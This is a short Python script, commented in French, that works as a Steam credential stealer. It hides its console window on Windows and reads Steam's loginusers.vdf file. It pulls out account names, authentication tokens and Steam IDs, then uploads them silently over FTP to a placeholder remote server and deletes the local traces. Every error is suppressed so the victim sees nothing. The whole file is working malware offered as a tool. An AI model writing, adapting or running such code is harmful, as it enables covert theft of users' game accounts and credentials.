import os
import re
import sys
from ftplib import FTP
from datetime import datetime

# Masquer la console sur Windows
if sys.platform == 'win32':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Configuration FTP
FTP_HOST = "ftp.example.com"
FTP_USER = "votre_utilisateur"
FTP_PASS = "votre_mot_de_passe"
FTP_PORT = 21
FTP_REMOTE_DIR = "/htdocs/Login"

config_path = r'C:\Program Files (x86)\steam\config\loginusers.vdf'

# Créer un nom de fichier unique avec date et heure
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
filename = f"steam_log_{timestamp}.txt"

# Créer le fichier en mode silencieux
with open(filename, 'w', encoding='utf-8') as output_file:
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            output_file.write("=== CONTENU DU FICHIER ===\n")
            output_file.write(content)
            output_file.write("\n=== FIN DU CONTENU ===\n\n")
            
            all_matches = re.findall(r'"([^"]+)"\s+"([^"]*)"', content)
            output_file.write("=== TOUTES LES CLÉS ===\n")
            for key, value in all_matches:
                output_file.write(f"{key}: {value}\n")
            
            token_match = re.search(r'"(?:AuthTicket|WGToken|RememberPassword)"\s*"(.*?)"', content, re.IGNORECASE)
            username_match = re.search(r'"(?:AccountName|PersonaName)"\s*"(.*?)"', content, re.IGNORECASE)
            steamid_match = re.search(r'"(\d{17})"', content)
            
            output_file.write("\n=== RÉSULTATS ===\n")
            if username_match:
                output_file.write(f"Utilisateur: {username_match.group(1)}\n")
            if token_match:
                output_file.write(f"Jeton: {token_match.group(1)}\n")
            if steamid_match:
                output_file.write(f"Steam ID: {steamid_match.group(1)}\n")
        except:
            pass

# Upload FTP silencieux
try:
    ftp = FTP()
    ftp.connect(FTP_HOST, FTP_PORT, timeout=10)
    ftp.login(FTP_USER, FTP_PASS)
    try:
        ftp.cwd(FTP_REMOTE_DIR)
    except:
        parts = FTP_REMOTE_DIR.strip('/').split('/')
        current = ''
        for part in parts:
            current += '/' + part
            try:
                ftp.cwd(current)
            except:
                ftp.mkd(current)
                ftp.cwd(current)
    with open(filename, 'rb') as f:
        ftp.storbinary(f'STOR {filename}', f)
    ftp.quit()
except:
    pass

# Optionnel : supprimer le fichier local après upload
try:
    os.remove(filename)
except:
    pass
